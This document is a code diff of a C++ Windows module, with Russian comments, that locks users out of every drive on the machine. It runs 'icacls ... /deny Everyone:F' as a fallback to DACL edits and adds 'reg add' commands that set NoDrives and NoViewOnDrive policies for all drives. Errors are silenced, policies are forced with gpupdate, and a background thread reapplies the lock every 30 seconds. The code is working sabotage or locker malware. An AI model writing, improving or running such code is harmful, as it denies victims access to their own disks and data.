@@ -7,8 +7,9 @@
 
 namespace fs = std::filesystem;
 
-void BlockDriveAccess(const std::string& drivePath) {
+void BlockDriveAccessUniversal(const std::string& drivePath) {
     try {
+        // Для Windows 7 и выше
         PACL pDacl = NULL;
         PSECURITY_DESCRIPTOR pSecurityDescriptor = NULL;
         DWORD dwError = GetNamedSecurityInfoA(
@@ -46,10 +47,14 @@ void BlockDriveAccess(const std::string& drivePath) {
 
         LocalFree(pSecurityDescriptor);
         LocalFree(pNewDacl);
-    } catch (...) {}
+    } catch (...) {
+        // Fallback: через командную строку
+        std::string cmd = "icacls " + drivePath + " /deny Everyone:F";
+        system(cmd.c_str());
+    }
 }
 
-void HideDrivesFromExplorer() {
+void HideDrivesUniversal() {
     HKEY hKey;
     DWORD value = 0x00000000;
     if (RegCreateKeyExA(HKEY_CURRENT_USER,
@@ -59,30 +64,33 @@ void HideDrivesFromExplorer() {
         RegSetValueExA(hKey, "NoViewOnDrive", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
         RegCloseKey(hKey);
     }
+    
+    // Fallback через реестр (работает везде)
+    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDrives /t REG_DWORD /d 0xFFFFFFFF /f 2>nul");
+    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoViewOnDrive /t REG_DWORD /d 0xFFFFFFFF /f 2>nul");
+    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDrives /t REG_DWORD /d 0xFFFFFFFF /f 2>nul");
+    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoViewOnDrive /t REG_DWORD /d 0xFFFFFFFF /f 2>nul");
+    
+    // Для Windows 7: обновляем политики
+    system("gpupdate /force 2>nul");
 }
 
-void DenyDiskAccess() {
+void DenyDiskAccessUniversal() {
     for (char drive = 'A'; drive <= 'Z'; drive++) {
         std::string drivePath = std::string(1, drive) + ":\\";
         if (fs::exists(drivePath) && fs::is_directory(drivePath)) {
-            BlockDriveAccess(drivePath);
+            BlockDriveAccessUniversal(drivePath);
         }
     }
-
-    HideDrivesFromExplorer();
-
-    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDrives /t REG_DWORD /d 0xFFFFFFFF /f");
-    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoViewOnDrive /t REG_DWORD /d 0xFFFFFFFF /f");
-    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDrives /t REG_DWORD /d 0xFFFFFFFF /f");
-    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoViewOnDrive /t REG_DWORD /d 0xFFFFFFFF /f");
-    system("gpupdate /force");
+    
+    HideDrivesUniversal();
 }
 
 void InitializeDiskBlockModule() {
     std::thread diskThread([]() {
         Sleep(5000);
         while (true) {
-            DenyDiskAccess();
+            DenyDiskAccessUniversal();
             Sleep(30000);
         }
     });
